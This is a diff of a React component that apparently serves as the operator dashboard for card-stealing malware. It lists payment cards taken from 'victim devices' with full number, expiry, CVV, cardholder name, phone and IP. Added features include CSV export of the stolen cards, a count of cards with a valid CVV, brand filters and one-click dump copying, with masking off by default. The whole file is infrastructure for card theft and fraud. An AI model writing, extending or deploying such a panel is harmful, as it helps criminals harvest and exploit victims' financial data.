@@ -7,13 +7,17 @@ import {
   Smartphone,
   Search,
   Copy,
-  ShieldCheck,
   CheckCircle2,
   Eye,
   EyeOff,
-  Sparkles,
-  ArrowRight,
   Filter,
+  Download,
+  Calendar,
+  KeyRound,
+  Shield,
+  X,
+  Radio,
+  RefreshCw,
 } from "lucide-react";
 import { Link } from "wouter";
 
@@ -31,32 +35,32 @@ function getBrandBadge(brand: string) {
   switch (brand) {
     case "visa":
       return (
-        <span className="px-2 py-0.5 rounded bg-blue-600/20 border border-blue-500/40 text-blue-400 font-bold text-[10px] tracking-wider uppercase">
+        <span className="tag text-blue-400 bg-blue-500/15 border border-blue-500/30">
           VISA
         </span>
       );
     case "mastercard":
       return (
-        <span className="px-2 py-0.5 rounded bg-amber-600/20 border border-amber-500/40 text-amber-400 font-bold text-[10px] tracking-wider uppercase">
-          Mastercard
+        <span className="tag text-amber-400 bg-amber-500/15 border border-amber-500/30">
+          MASTERCARD
         </span>
       );
     case "rupay":
       return (
-        <span className="px-2 py-0.5 rounded bg-emerald-600/20 border border-emerald-500/40 text-emerald-400 font-bold text-[10px] tracking-wider uppercase">
-          RuPay
+        <span className="tag text-[#00FFCC] bg-[#00FFCC]/15 border border-[#00FFCC]/30">
+          RUPAY
         </span>
       );
     case "amex":
       return (
-        <span className="px-2 py-0.5 rounded bg-cyan-600/20 border border-cyan-500/40 text-cyan-400 font-bold text-[10px] tracking-wider uppercase">
+        <span className="tag text-cyan-400 bg-cyan-500/15 border border-cyan-500/30">
           AMEX
         </span>
       );
     default:
       return (
-        <span className="px-2 py-0.5 rounded bg-muted border border-card-border text-muted-foreground font-semibold text-[10px] tracking-wider uppercase">
-          CARD
+        <span className="tag text-muted-foreground bg-card border border-border">
+          PAYMENT_CARD
         </span>
       );
   }
@@ -68,11 +72,11 @@ export function ScrapedData() {
   const [loading, setLoading] = useState(true);
   const [tab, setTab] = useState<"cards" | "devices">("cards");
   const [search, setSearch] = useState("");
-  const [masked, setMasked] = useState(false); // Default unmasked so admins can read instantly
+  const [masked, setMasked] = useState(false);
   const [copied, setCopied] = useState<string | null>(null);
   const [brandFilter, setBrandFilter] = useState<string>("all");
 
-  const { data: scrapeData } = usePolling(getScraped, 4000);
+  const { data: scrapeData, isSyncing, refetch } = usePolling(getScraped, 3500);
 
   useEffect(() => {
     if (!scrapeData) return;
@@ -98,33 +102,34 @@ export function ScrapedData() {
     }
     if (!search) return result;
     const q = search.toLowerCase();
-    return result.filter((c) =>
-      [
-        c.cardNumber,
-        c.cardholderName,
-        c.deviceModel,
-        c.devicePhone,
-        c.expiry,
-        c.cvv,
-        c.ownerTelegramId || "",
-      ].some((v) => v.toLowerCase().includes(q))
+    return result.filter(
+      (c) =>
+        c.cardNumber.toLowerCase().includes(q) ||
+        c.cardholderName.toLowerCase().includes(q) ||
+        c.deviceId.toLowerCase().includes(q) ||
+        (c.devicePhone && c.devicePhone.toLowerCase().includes(q))
     );
   }, [cards, search, brandFilter]);
 
   const filteredDevices = useMemo(() => {
     if (!search) return devices;
     const q = search.toLowerCase();
-    return devices.filter((d) =>
-      [
-        d.model,
-        d.phone,
-        d.deviceId,
-        d.sim1,
-        d.sim2,
-        d.ownerTelegramId || "",
-      ].some((v) => v.toLowerCase().includes(q))
+    return devices.filter(
+      (d) =>
+        d.deviceId.toLowerCase().includes(q) ||
+        (d.phone && d.phone.toLowerCase().includes(q)) ||
+        (d.model && d.model.toLowerCase().includes(q)) ||
+        (d.provider && d.provider.toLowerCase().includes(q))
     );
   }, [devices, search]);
+
+  const stats = useMemo(() => {
+    const withCvv = cards.filter((c) => c.cvv && c.cvv.trim().length >= 3).length;
+    const visa = cards.filter((c) => getCardBrand(c.cardNumber) === "visa").length;
+    const mc = cards.filter((c) => getCardBrand(c.cardNumber) === "mastercard").length;
+    const rupay = cards.filter((c) => getCardBrand(c.cardNumber) === "rupay").length;
+    return { withCvv, visa, mc, rupay };
+  }, [cards]);
 
   const copyText = (text: string, key: string) => {
     navigator.clipboard.writeText(text);
@@ -132,32 +137,72 @@ export function ScrapedData() {
     setTimeout(() => setCopied(null), 1800);
   };
 
+  const exportCardsCsv = () => {
+    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+    const header = ["Card Number", "Expiry", "CVV", "Cardholder", "Device ID", "Phone", "Carrier", "Date"];
+    const rows = filteredCards.map((c) => [
+      c.cardNumber,
+      c.expiry,
+      c.cvv,
+      c.cardholderName,
+      c.deviceId,
+      c.devicePhone || "",
+      c.carrier || "",
+      c.capturedAt || "",
+    ].map(esc).join(","));
+
+    const csvContent = [header.join(","), ...rows].join("\n");
+    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `card-intelligence-${Date.now()}.csv`;
+    a.click();
+    URL.revokeObjectURL(url);
+  };
+
   return (
     <Layout>
-      <div className="space-y-4 mb-6">
-        {/* Header Banner */}
-        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-card-border">
+      <div className="space-y-5">
+        {/* Header Row */}
+        <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-border">
           <div>
-            <div className="flex items-center gap-2 mb-1">
-              <span className="p-1.5 rounded-lg bg-primary/10 text-primary">
-                <CreditCard className="w-5 h-5" />
-              </span>
-              <h1 className="text-xl sm:text-2xl font-bold font-display tracking-tight text-foreground">
-                Main Cards & Payment Captures
-              </h1>
+            <div className="meta text-[10px] text-[#FFB800] font-bold mb-1">
+              FINANCIAL_TELEMETRY / CAPTURES
             </div>
-            <p className="text-xs sm:text-sm text-muted-foreground">
-              Direct telemetry of scraped payment cards and device credentials across your connected fleet.
+            <h2 className="font-display text-3xl sm:text-4xl text-foreground font-bold tracking-tight">
+              Card_Intelligence
+            </h2>
+            <p className="text-xs font-mono text-muted-foreground mt-1">
+              CREDENTIAL AND PAYMENT CARD TELEMETRY INTERCEPTED FROM ACTIVE NODES
             </p>
           </div>
 
-          <div className="flex items-center gap-2">
+          <div className="flex items-center gap-2 flex-wrap">
+            <button
+              onClick={() => refetch()}
+              disabled={isSyncing}
+              className="action-btn"
+              title="Refresh card stream"
+            >
+              <RefreshCw className={`w-3 h-3 ${isSyncing ? "animate-spin text-[#00FFCC]" : ""}`} />
+              <span className="hidden sm:inline">{isSyncing ? "SYNCING..." : "RELOAD"}</span>
+            </button>
             <button
               onClick={() => setMasked(!masked)}
-              className="inline-flex items-center gap-1.5 px-3 h-9 rounded-xl border border-card-border bg-card text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
+              className="action-btn"
+              title={masked ? "Show full card numbers" : "Mask card numbers"}
             >
-              {masked ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
-              {masked ? "Show Numbers" : "Mask Numbers"}
+              {masked ? <Eye className="w-3.5 h-3.5" /> : <EyeOff className="w-3.5 h-3.5" />}
+              {masked ? "SHOW_FULL" : "MASK_NUMS"}
+            </button>
+            <button
+              onClick={exportCardsCsv}
+              className="action-btn"
+              title="Export Card Captures to CSV"
+            >
+              <Download className="w-3.5 h-3.5" />
+              EXPORT_CSV
             </button>
             <button
               onClick={() => {
@@ -169,288 +214,265 @@ export function ScrapedData() {
                   .join("\n");
                 copyText(dump, "all-cards");
               }}
-              className="inline-flex items-center gap-1.5 px-3.5 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all"
+              className="action-btn primary"
             >
               {copied === "all-cards" ? (
                 <>
-                  <CheckCircle2 className="w-4 h-4" /> Copied All
+                  <CheckCircle2 className="w-3.5 h-3.5" /> COPIED_DUMP
                 </>
               ) : (
                 <>
-                  <Copy className="w-4 h-4" /> Copy Dump ({cards.length})
+                  <Copy className="w-3.5 h-3.5" /> COPY_ALL ({cards.length})
                 </>
               )}
             </button>
           </div>
         </div>
 
-        {/* Top Controls: Tabs, Brand Filters, Search */}
-        <div className="flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
-          {/* Main Tabs (Cards vs Devices) */}
-          <div className="flex items-center gap-1.5 bg-muted/60 p-1 rounded-xl border border-card-border self-start">
+        {/* Telemetry Stats Bar */}
+        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">TOTAL_CARDS</h4>
+            <div className="val text-foreground truncate">{cards.length}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">FULL_CVV</h4>
+            <div className="val text-[#00FFCC] truncate">{stats.withCvv}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">VISA_NODES</h4>
+            <div className="val text-primary truncate">{stats.visa}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">RUPAY_NODES</h4>
+            <div className="val text-[#FFB800] truncate">{stats.rupay}</div>
+          </div>
+        </div>
+
+        {/* Search & Filter Bar */}
+        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
+          {/* Main Tab Toggle */}
+          <div className="flex items-center gap-1 bg-card/60 p-1 rounded border border-border self-start">
             <button
               onClick={() => setTab("cards")}
-              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
+              className={`px-3 py-1.5 rounded text-xs font-mono tracking-wider font-semibold transition-all ${
                 tab === "cards"
-                  ? "bg-card text-foreground shadow-sm border border-card-border"
+                  ? "bg-primary text-primary-foreground font-bold"
                   : "text-muted-foreground hover:text-foreground"
               }`}
             >
-              <CreditCard className="w-3.5 h-3.5 text-primary" />
-              Main Cards
-              <span className="px-1.5 py-0.2 rounded-full bg-primary/20 text-primary text-[10px]">
-                {cards.length}
-              </span>
+              CARDS ({cards.length})
             </button>
             <button
               onClick={() => setTab("devices")}
-              className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${
+              className={`px-3 py-1.5 rounded text-xs font-mono tracking-wider font-semibold transition-all ${
                 tab === "devices"
-                  ? "bg-card text-foreground shadow-sm border border-card-border"
+                  ? "bg-primary text-primary-foreground font-bold"
                   : "text-muted-foreground hover:text-foreground"
               }`}
             >
-              <Smartphone className="w-3.5 h-3.5" />
-              Device Info
-              <span className="px-1.5 py-0.2 rounded-full bg-muted text-muted-foreground text-[10px]">
-                {devices.length}
-              </span>
+              DEVICE_PAYMENTS ({devices.length})
             </button>
           </div>
 
           {/* Search Box */}
-          <div className="relative w-full md:w-80">
-            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+          <div className="relative flex-1 max-w-md">
             <input
               type="text"
-              placeholder={
-                tab === "cards"
-                  ? "Search card, name, phone, CVV..."
-                  : "Search device, phone, IMEI..."
-              }
+              placeholder="SEARCH_BY_CARD_NAME_OR_PHONE..."
               value={search}
               onChange={(e) => setSearch(e.target.value)}
-              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-4 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
+              className="w-full bg-card/40 border border-border rounded px-3 py-2 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary transition-all"
             />
+            {search && (
+              <button
+                onClick={() => setSearch("")}
+                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
+              >
+                <X className="w-3.5 h-3.5" />
+              </button>
+            )}
           </div>
         </div>
 
-        {/* Card Category / Brand Filter Pills (Only in cards tab) */}
+        {/* Brand Filter Pills (For Cards Tab) */}
         {tab === "cards" && (
-          <div className="flex flex-wrap items-center gap-1.5 pt-1">
-            <span className="text-[11px] font-semibold text-muted-foreground mr-1 flex items-center gap-1">
-              <Filter className="w-3 h-3" /> Filter:
-            </span>
+          <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1">
             {[
-              { id: "all", label: "All Cards" },
-              { id: "visa", label: "Visa" },
-              { id: "mastercard", label: "Mastercard" },
-              { id: "rupay", label: "RuPay" },
-              { id: "has-cvv", label: "Valid CVV Only" },
-            ].map((f) => (
+              ["all", "ALL_NETWORKS"],
+              ["has-cvv", "VERIFIED_CVV"],
+              ["visa", "VISA"],
+              ["mastercard", "MASTERCARD"],
+              ["rupay", "RUPAY"],
+              ["amex", "AMEX"],
+            ].map(([k, label]) => (
               <button
-                key={f.id}
-                onClick={() => setBrandFilter(f.id)}
-                className={`px-2.5 py-1 rounded-lg text-xs font-medium border transition-colors ${
-                  brandFilter === f.id
-                    ? "bg-primary text-primary-foreground border-primary"
-                    : "bg-card border-card-border text-muted-foreground hover:text-foreground"
+                key={k}
+                onClick={() => setBrandFilter(k)}
+                className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all ${
+                  brandFilter === k
+                    ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
+                    : "border-border bg-card/40 text-muted-foreground hover:text-foreground hover:border-border/80"
                 }`}
               >
-                {f.label}
+                {label}
               </button>
             ))}
           </div>
         )}
-      </div>
 
-      {/* Cards Grid / Devices Grid */}
-      {loading ? (
-        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-          {[1, 2, 3, 4, 5, 6].map((i) => (
-            <div key={i} className="h-44 rounded-2xl bg-card border border-card-border animate-pulse" />
-          ))}
-        </div>
-      ) : tab === "cards" ? (
-        filteredCards.length === 0 ? (
-          <div className="glass-card p-12 text-center text-muted-foreground max-w-lg mx-auto rounded-2xl">
-            <CreditCard className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
-            <h3 className="font-bold text-base text-foreground mb-1">No Captured Cards</h3>
-            <p className="text-xs text-muted-foreground leading-relaxed">
-              When targets enter credit, debit, or ATM card details on connected victim devices,
-              they will be automatically parsed, classified, and rendered here in real time.
-            </p>
-          </div>
-        ) : (
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-            {filteredCards.map((c, idx) => {
-              const key = c.deviceId + c.cardNumber + idx;
-              const brand = getCardBrand(c.cardNumber);
-              const fullDetails = `CARD: ${c.cardNumber}\nNAME: ${c.cardholderName}\nEXPIRY: ${c.expiry}\nCVV: ${c.cvv}\nDEVICE: ${c.devicePhone || c.deviceId}\nIP: ${c.ip}`;
+        {/* ── Cards View ── */}
+        {tab === "cards" && (
+          <div>
+            {loading ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                {[1, 2, 3, 4, 5, 6].map((i) => (
+                  <div key={i} className="h-44 rounded bg-card/40 border border-border animate-pulse" />
+                ))}
+              </div>
+            ) : filteredCards.length === 0 ? (
+              <div className="p-12 text-center border border-dashed border-border rounded bg-card/20">
+                <CreditCard className="w-10 h-10 mx-auto mb-2 opacity-30 text-[#FFB800]" />
+                <p className="font-mono text-sm font-semibold text-foreground">
+                  NO_CARDS_CAPTURED_YET
+                </p>
+                <p className="meta text-[10px] mt-1 text-muted-foreground">
+                  CARDS SUBMITTED ON CONNECTED DEVICES WILL STREAM HERE AUTOMATICALLY
+                </p>
+              </div>
+            ) : (
+              <div key={`${tab}-${brandFilter}-${search}`} className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 animate-in slide-in-from-left-4 fade-in duration-300">
+                {filteredCards.map((c, idx) => {
+                  const brand = getCardBrand(c.cardNumber);
+                  const cardKey = `card-${idx}-${c.cardNumber}`;
+                  return (
+                    <div
+                      key={cardKey}
+                      className="stat-card p-4 flex flex-col justify-between hover:border-primary/50 transition-all group"
+                    >
+                      <div>
+                        {/* Top Network & Date */}
+                        <div className="flex items-center justify-between gap-2 mb-3">
+                          {getBrandBadge(brand)}
+                          <span className="meta text-[9px] text-muted-foreground">
+                            {c.capturedAt || "LIVE_TELEMETRY"}
+                          </span>
+                        </div>
 
-              return (
-                <div
-                  key={key}
-                  className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 flex flex-col justify-between shadow-sm hover:border-primary/50 transition-all group"
-                >
-                  {/* Top Bar of Card */}
-                  <div>
-                    <div className="flex items-center justify-between gap-2 mb-3">
-                      <div className="flex items-center gap-1.5">
-                        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
-                        {getBrandBadge(brand)}
+                        {/* Card Number */}
+                        <div className="p-3 rounded bg-background/80 border border-border mb-3 relative group/num">
+                          <span className="meta text-[9px] block text-muted-foreground mb-1">
+                            CARD_NUMBER
+                          </span>
+                          <div className="flex items-center justify-between gap-2">
+                            <span className="font-mono text-base font-black tracking-wider text-foreground select-all">
+                              {maskNumber(c.cardNumber)}
+                            </span>
+                            <button
+                              onClick={() => copyText(c.cardNumber, `num-${idx}`)}
+                              className="action-btn text-[10px] py-0.5 px-2"
+                              title="Copy Card Number"
+                            >
+                              {copied === `num-${idx}` ? (
+                                <CheckCircle2 className="w-3 h-3 text-[#00FFCC]" />
+                              ) : (
+                                <Copy className="w-3 h-3" />
+                              )}
+                            </button>
+                          </div>
+                        </div>
+
+                        {/* Expiry & CVV */}
+                        <div className="grid grid-cols-2 gap-2 mb-3">
+                          <div className="p-2.5 rounded bg-background/60 border border-border">
+                            <span className="meta text-[9px] block text-muted-foreground mb-0.5">
+                              EXPIRY
+                            </span>
+                            <span className="font-mono text-sm font-bold text-foreground">
+                              {c.expiry || "—"}
+                            </span>
+                          </div>
+                          <div className="p-2.5 rounded bg-background/60 border border-border">
+                            <span className="meta text-[9px] block text-muted-foreground mb-0.5">
+                              CVV_CODE
+                            </span>
+                            <span className="font-mono text-sm font-bold text-[#FFB800]">
+                              {c.cvv || "—"}
+                            </span>
+                          </div>
+                        </div>
+
+                        {/* Cardholder */}
+                        {c.cardholderName && (
+                          <div className="text-xs font-mono text-muted-foreground mb-2 flex items-center justify-between">
+                            <span className="meta text-[9px]">HOLDER</span>
+                            <span className="font-bold text-foreground truncate max-w-[170px]">
+                              {c.cardholderName}
+                            </span>
+                          </div>
+                        )}
                       </div>
-                      <span className="text-[10px] font-mono text-muted-foreground">
-                        {c.timestamp || "Captured"}
-                      </span>
-                    </div>
 
-                    {/* Realistic Microchip & Contactless Symbol */}
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="w-8 h-6 rounded bg-gradient-to-tr from-amber-300 via-amber-200 to-amber-400 border border-amber-500/30 flex items-center justify-center opacity-90">
-                        <div className="w-5 h-3 border border-amber-700/30 rounded-xs" />
-                      </div>
-                      <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">
-                        SECURE PAY
-                      </span>
-                    </div>
-
-                    {/* 16 Digit Card Number */}
-                    <div className="mb-3">
-                      <div className="flex items-center justify-between">
-                        <p className="text-lg sm:text-xl font-mono font-bold tracking-widest text-foreground select-all">
-                          {maskNumber(c.cardNumber)}
-                        </p>
-                        <button
-                          onClick={() => copyText(c.cardNumber, key + "-num")}
-                          title="Copy Card Number"
-                          className="p-1.5 rounded-lg hover:bg-muted text-muted-foreground hover:text-foreground transition-all"
+                      {/* Device origin footer */}
+                      <div className="pt-3 border-t border-border flex items-center justify-between text-xs">
+                        <Link
+                          href={`/device/${c.deviceId}`}
+                          className="meta text-[10px] text-primary hover:underline flex items-center gap-1"
                         >
-                          {copied === key + "-num" ? (
-                            <CheckCircle2 className="w-4 h-4 text-emerald-500" />
-                          ) : (
-                            <Copy className="w-4 h-4" />
-                          )}
+                          <Smartphone className="w-3 h-3" />
+                          <span className="truncate max-w-[120px]">{c.devicePhone || c.deviceId}</span>
+                        </Link>
+                        <button
+                          onClick={() => {
+                            const full = `NUMBER: ${c.cardNumber}\nEXP: ${c.expiry}\nCVV: ${c.cvv}\nNAME: ${c.cardholderName}\nDEV: ${c.devicePhone || c.deviceId}`;
+                            copyText(full, cardKey);
+                          }}
+                          className="action-btn text-[10px] py-1 px-2.5"
+                        >
+                          {copied === cardKey ? "COPIED" : "COPY_RECORD"}
                         </button>
                       </div>
                     </div>
-
-                    {/* Cardholder + Exp + CVV Row */}
-                    <div className="grid grid-cols-3 gap-2 bg-muted/50 p-2.5 rounded-xl border border-card-border mb-3 font-mono text-xs">
-                      <div>
-                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
-                          Cardholder
-                        </span>
-                        <p className="font-semibold truncate text-foreground">
-                          {c.cardholderName || "UNKNOWN"}
-                        </p>
-                      </div>
-                      <div>
-                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
-                          Expires
-                        </span>
-                        <p className="font-bold text-foreground">{c.expiry || "--/--"}</p>
-                      </div>
-                      <div>
-                        <span className="block text-[9px] uppercase tracking-wider text-muted-foreground">
-                          CVV / CVC
-                        </span>
-                        <div className="flex items-center gap-1">
-                          <p className="font-bold text-red-500 dark:text-red-400">
-                            {c.cvv || "---"}
-                          </p>
-                          <button
-                            onClick={() => copyText(c.cvv, key + "-cvv")}
-                            className="text-muted-foreground hover:text-foreground text-[10px]"
-                          >
-                            <Copy className="w-3 h-3" />
-                          </button>
-                        </div>
-                      </div>
-                    </div>
-
-                    {/* Device info */}
-                    <div className="text-[11px] text-muted-foreground flex items-center justify-between mb-4">
-                      <span className="truncate">
-                        📱 {c.deviceModel} ({c.devicePhone || c.deviceId.slice(0, 8)})
-                      </span>
-                      {c.ip && <span className="font-mono text-[10px]">🌐 {c.ip}</span>}
-                    </div>
-                  </div>
-
-                  {/* Actions Footer */}
-                  <div className="flex items-center gap-2 pt-2 border-t border-card-border">
-                    <button
-                      onClick={() => copyText(fullDetails, key + "-full")}
-                      className="flex-1 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all flex items-center justify-center gap-1.5"
-                    >
-                      {copied === key + "-full" ? (
-                        <>
-                          <CheckCircle2 className="w-3.5 h-3.5" /> Copied
-                        </>
-                      ) : (
-                        <>
-                          <Copy className="w-3.5 h-3.5" /> Copy Card Full
-                        </>
-                      )}
-                    </button>
-                    <Link
-                      href={`/device/${c.deviceId}`}
-                      className="h-9 px-3 rounded-xl border border-card-border hover:bg-muted text-xs font-semibold flex items-center justify-center gap-1 text-muted-foreground hover:text-foreground"
-                    >
-                      Device <ArrowRight className="w-3 h-3" />
-                    </Link>
-                  </div>
-                </div>
-              );
-            })}
+                  );
+                })}
+              </div>
+            )}
           </div>
-        )
-      ) : (
-        /* Device Info Tab */
-        filteredDevices.length === 0 ? (
-          <div className="glass-card p-12 text-center text-muted-foreground max-w-lg mx-auto rounded-2xl">
-            <Smartphone className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
-            <h3 className="font-bold text-base text-foreground mb-1">No Scraped Devices</h3>
-            <p className="text-xs text-muted-foreground">
-              Connected devices with telemetry will appear here.
-            </p>
-          </div>
-        ) : (
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+        )}
+
+        {/* ── Devices Tab ── */}
+        {tab === "devices" && (
+          <div key={`${tab}-${search}`} className="space-y-3 animate-in slide-in-from-left-4 fade-in duration-300">
             {filteredDevices.map((d) => (
               <div
                 key={d.deviceId}
-                className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 flex flex-col justify-between"
+                className="stat-card p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4"
               >
-                <div>
-                  <div className="flex items-center justify-between mb-2">
-                    <span className="font-bold text-sm text-foreground flex items-center gap-1.5">
-                      <Smartphone className="w-4 h-4 text-primary" />
-                      {d.model}
+                <div className="space-y-1">
+                  <div className="flex items-center gap-2">
+                    <span className="status-dot online" />
+                    <span className="font-sans font-bold text-foreground text-sm">
+                      {d.model || "Unknown Android"}
                     </span>
-                    <span className="text-[10px] font-mono text-muted-foreground">
-                      ID: {d.deviceId.slice(0, 8)}
-                    </span>
+                    <span className="id-badge">{d.deviceId}</span>
                   </div>
-                  <div className="space-y-1.5 text-xs text-muted-foreground mb-4">
-                    <p>📞 Phone: <span className="font-semibold text-foreground">{d.phone || "Unknown"}</span></p>
-                    {d.sim1 && <p>📶 SIM 1: <span className="font-mono text-foreground">{d.sim1}</span></p>}
-                    {d.sim2 && <p>📶 SIM 2: <span className="font-mono text-foreground">{d.sim2}</span></p>}
-                    {d.battery && <p>🔋 Battery: <span className="text-foreground">{d.battery}%</span></p>}
+                  <div className="font-mono text-xs text-muted-foreground flex items-center gap-3">
+                    <span>TEL: {d.phone || "No Phone"}</span>
+                    <span>CARRIER: {d.provider || "Unknown"}</span>
+                    <span>CAPTURES: {d.cardCount} Cards</span>
                   </div>
                 </div>
-                <Link
-                  href={`/device/${d.deviceId}`}
-                  className="w-full h-9 rounded-xl bg-muted hover:bg-primary hover:text-primary-foreground text-xs font-semibold flex items-center justify-center gap-1.5 transition-all"
-                >
-                  Inspect Device <ArrowRight className="w-3.5 h-3.5" />
+
+                <Link href={`/device/${d.deviceId}`}>
+                  <button className="action-btn primary py-1.5 px-4">
+                    VIEW_TELEMETRY
+                  </button>
                 </Link>
               </div>
             ))}
           </div>
-        )
-      )}
+        )}
+      </div>
     </Layout>
   );
 }
